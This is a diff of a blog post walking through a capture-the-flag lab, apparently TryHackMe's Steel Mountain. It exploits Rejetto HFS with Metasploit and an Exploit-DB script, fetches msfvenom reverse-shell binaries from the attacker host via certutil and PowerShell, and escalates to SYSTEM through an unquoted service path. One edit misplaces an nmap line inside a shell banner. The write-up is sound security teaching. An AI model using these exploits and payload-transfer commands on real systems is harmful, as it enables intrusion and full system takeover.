@@ -26,8 +26,7 @@ Time to climb up the mountain of Mr. Robot.
 
 Run nmap to get a list of the services running.
 
-{% raw %}
-```bash
+{% capture nmap %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# nmap -sC -sV -A -O -oN nmap 10.10.109.201
 Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 11:25 GMT
 Nmap scan report for 10.10.109.201
@@ -49,14 +48,14 @@ PORT      STATE SERVICE            VERSION
 |_http-title: HFS /
 
 <snip>
-```
-{% endraw %}
+
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run curl -I to pull the headers to try and fingerprint the technology.
 
-{% raw %}
-```bash
+{% capture curli %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# curl -I http://10.10.109.201
 HTTP/1.1 200 OK
 Content-Length: 772
@@ -66,8 +65,8 @@ Accept-Ranges: bytes
 ETag: "9736bb793475d51:0"
 Server: Microsoft-IIS/8.5
 Date: Tue, 25 Feb 2025 11:36:27 GMT
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the Landing Page of the website.
@@ -81,10 +80,7 @@ Check the Landing Page of the website.
 <br />
 View the source code looking for anything interesting.
 
-{% raw %}
-```html
-view-source:http://10.10.109.201/
-
+{% capture landingsource %}
 <!doctype html>
 <html lang="en">
 <head>
@@ -101,8 +97,8 @@ view-source:http://10.10.109.201/
 </center>
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.109.201/' content=landingsource %}
 
 <br />
 Reviewing the nmap results, search for the HttpFileServer httpd 2.3.
@@ -116,8 +112,7 @@ Reviewing the nmap results, search for the HttpFileServer httpd 2.3.
 <br />
 Run msfconsole.  The q option suppresses the ASCII art.  Search for the CVE indicated in the Google search.  There was only one result and chose to use that option.  Show the options for that exploit.  Set the rhosts and rport options.  Since I am using the provided Attack Box, I don't need lport.  Use exploit to launch the exploit and get the meterpreter response.
 
-{% raw %}
-```bash
+{% capture msfconsolestart %}
 root@ip-10-10-30-38:~/Rooms/steelmountainmsfconsole -q
 This copy of metasploit-framework is more than two weeks old.
  Consider running 'msfupdate' to update to the latest version.
@@ -192,18 +187,23 @@ msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
 meterpreter > shell
 Process 780 created.
 Channel 2 created.
+{% endcapture %}
+
+{% capture msfconsoleshell %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=msfconsolestart %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=msfconsoleshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 C:\Users\bill\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -226,14 +226,13 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Download PowerUp.ps1.
 
-{% raw %}
-```bash
+{% capture downloadpowerup %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 --2025-02-25 12:24:24--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
@@ -245,38 +244,41 @@ Saving to: \u2018PowerUp.ps1\u2019
 PowerUp.ps1                                          100%[=====================================================================================================================>] 586.50K  --.-KB/s    in 0.007s  
 
 2025-02-25 12:24:24 (85.5 MB/s) - \u2018PowerUp.ps1\u2019 saved [600580/600580]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpowerup %}
 
 <br />
 Upload PowerUp.ps1 to the victim machine.
 
-{% raw %}
-```bash
+{% capture uploadpowerup %}
 meterpreter > upload PowerUp.ps1
 [*] Uploading  : /root/Rooms/steelmountain/PowerUp.ps1 -> PowerUp.ps1
 [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/Rooms/steelmountain/PowerUp.ps1 -> PowerUp.ps1
 [*] Completed  : /root/Rooms/steelmountain/PowerUp.ps1 -> PowerUp.ps1
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=uploadpowerup %}
 
 <br />
 Load the powershell meterpreter extension and drop into a PowerShell shell.
 
-{% raw %}
-```bash
+{% capture loadpowershell %}
 meterpreter > load powershell
 Loading extension powershell...Success.
 meterpreter > powershell_shell
+{% endcapture %}
+
+{% capture powershellstart %}
 PS >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=loadpowershell %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=powershellstart %}
 
 <br />
 Run all of the checks a part of the PowerUp script.  Look for something with unquoted service path and CanRestart is True.
 
-{% raw %}
-```bash
+{% capture invokeallchecks %}
 PS > . .\PowerUp.ps1
 PS > Invoke-AllChecks
 
@@ -291,14 +293,13 @@ Name           : AdvancedSystemCareService9
 Check          : Unquoted Service Paths
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=invokeallchecks %}
 
 <br />
 Use msfvenom to generate a service executable to replace the executable from the PowerUp results.
 
-{% raw %}
-```bash
+{% capture msfvenomgenerate %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.38 LPORT=9001 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -311,35 +312,32 @@ Final size of exe-service file: 15872 bytes
 Saved as: Advanced.exe
 root@ip-10-10-30-38:~/Rooms/steelmountain# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfvenomgenerate %}
 
 <br />
 Use certutil.exe to transfer the binary to the victim machine.
 
-{% raw %}
-```bash
+{% capture certutiltransfer %}
 PS > certutil.exe -urlcache -f http://10.10.30.38:8000/Advanced.exe Advanced.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=certutiltransfer %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# nc -nlvp 9001
 Listening on 0.0.0.0 9001
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Stop the servic from running.  Overwrite the binary in the path indicated.  Then restart the binary.
 
-{% raw %}
-```bash
+{% capture servicebinaryoverwrite %}
 PS > Stop-Service -Name "AdvancedSystemCareService9"
 PS > cp Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 PS > Start-Service -Name "AdvancedSystemCareService9"
@@ -351,29 +349,33 @@ ERROR:     + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceCo
 ERROR:    ServiceCommandException
 ERROR:     + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand
 ERROR:
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=servicebinaryoverwrite %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# nc -nlvp 9001
 Listening on 0.0.0.0 9001
 Connection received on 10.10.109.201 49303
+{% endcapture %}
+
+{% capture windowsshell %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 <redacteds>
@@ -395,8 +397,8 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 Lookup the exploit linked in the box description.
@@ -411,8 +413,7 @@ Lookup the exploit linked in the box description.
 <br />
 Download the exploit to the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadexploitdb %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# wget https://www.exploit-db.com/raw/39161 -O exploit.py
 --2025-02-25 12:53:23--  https://www.exploit-db.com/raw/39161
 Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
@@ -424,35 +425,32 @@ Saving to: \u2018exploit.py\u2019
 exploit.py                                           100%[=====================================================================================================================>]   2.46K  --.-KB/s    in 0s      
 
 2025-02-25 12:53:23 (339 MB/s) - \u2018exploit.py\u2019 saved [2515/2515]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploitdb %}
 
 <br />
 Copy nc.exe into the local working folder.
 
-{% raw %}
-```bash
+{% capture copync %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# cp `locate nc.exe` .
 root@ip-10-10-30-38:~/Rooms/steelmountain# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=copync %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startnclistener %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# nc -nlvp 443
 Listening on 0.0.0.0 443
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startnclistener %}
 
 <br />
 Update the script with the ip address and port for the attack.
 
-{% raw %}
-```python
+{% capture exploitpy %}
 #!/usr/bin/python
 # Exploit Title: HttpFileServer 2.3.x Remote Command Execution
 # Google Dork: intext:"httpfileserver 2.3"
@@ -465,44 +463,47 @@ Update the script with the ip address and port for the attack.
 	local_port = "443" # Local Port number
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='exploit.py' content=exploitpy %}
 
 <br />
 Run the exploit twice.  One time transfers the nc.exe to the victim.  One time for the exploit.
 
-{% raw %}
-```bash
+{% capture runittwice %}
 ┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
 └─$ python2 exploit.py 10.10.109.201 8080
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
 └─$ python2 exploit.py 10.10.109.201 8080
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runittwice %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchmanualshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.109.201] 49342
+{% endcapture %}
+
+{% capture windowsmanualshell %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchmanualshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsmanualshell %}
 
 <br />
 Download winpeas.exe to the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadwinpeas %}
 ┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASany.exe -O winpeas.exe
 --2025-02-26 00:13:40--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASany.exe
@@ -520,26 +521,24 @@ Saving to: ‘winpeas.exe’
 winpeas.exe                                                100%[========================================================================================================================================>]   9.67M  3.16MB/s    in 3.1s    
 
 2025-02-26 00:13:45 (3.16 MB/s) - ‘winpeas.exe’ saved [10143232/10143232]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadwinpeas %}
 
 <br />
 Use certutil.exe to transfer the peas to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferwinpeas %}
 <C:\Users\bill>certutil.exe -urlcache -f http://10.4.119.29/winpeas.exe winpeas.exe
 certutil.exe -urlcache -f http://10.4.119.29/winpeas.exe winpeas.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transferwinpeas %}
 
 <br />
 Run the winpeas.exe.
 
-{% raw %}
-```bash
+{% capture runwinpeas %}
 C:\Users\bill>.\winpeas.exe
 .\winpeas.exe
  [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
@@ -573,15 +572,14 @@ Long paths are disabled, so the maximum length of a path supported is 260 chars 
                  (((((((((((((((((((((((((((((( 
      
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=runwinpeas %}
 
 <br />
 Look up all the services.
 
-{% raw %}
-```bash
-LookC:\Users\bill>powershell -c "Get-Service"
+{% capture getservices %}
+C:\Users\bill>powershell -c "Get-Service"
 powershell -c "Get-Service"
 
 Status   Name               DisplayName                           
@@ -593,14 +591,13 @@ Running  AmazonSSMAgent     Amazon SSM Agent
 Running  AppHostSvc         Application Host Helper Service 
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=getservices %}
 
 <br />
 Generate the service binary payload with msfvenom...again.  Or use the last one from the meterpreter run.
 
-{% raw %}
-```bash
+{% capture msfvenomservice %}
 root@ip-10-10-30-38:~/Rooms/steelmountain# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.38 LPORT=9001 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -615,35 +612,32 @@ root@ip-10-10-30-38:~/Rooms/steelmountain# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfvenomservice %}
 
 <br />
 Use PowerShell to transfer the file to the victim machine.
 
-{% raw %}
-```bash
+{% capture powershellwget %}
 C:\Users\bill>powershell -c wget "http://10.4.119.29:8000/Advanced.exe" -outfile "Advanced.exe"
 powershell -c wget "http://10.4.119.29:8000/Advanced.exe" -outfile "Advanced.exe"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=powershellwget %}
 
 <br />
 Create a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener9001 %}
 ┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
 └─$ nc -nlvp 9001                             
 listening on [any] 9001 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener9001 %}
 
 <br />
 Stop the service from running.  Overwrite the binary.  Start the service again.
 
-{% raw %}
-```bash
+{% capture stopoverwritestart %}
 C:\Users\bill>sc stop AdvancedSystemCareService9
 sc stop AdvancedSystemCareService9
 [SC] ControlService FAILED 1062:
@@ -670,26 +664,32 @@ SERVICE_NAME: AdvancedSystemCareService9
         WAIT_HINT          : 0x7d0
         PID                : 2044
         FLAGS              : 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=stopoverwritestart %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchthesystem %}
 ┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
 └─$ nc -nlvp 9001                             
 listening on [any] 9001 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.109.201] 49410
 Microsoft Windows [Version 6.3.9600]
+Host is up (0.25s latency).
+{% endcapture %}
+
+{% capture windowssystemshell %}
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
 whoami
 nt authority\system
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchthesystem %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowssystemshell %}
 
 <br />
 And here we on top of the mountain.  Hope you enjoyed the climb.  See you in the next one.
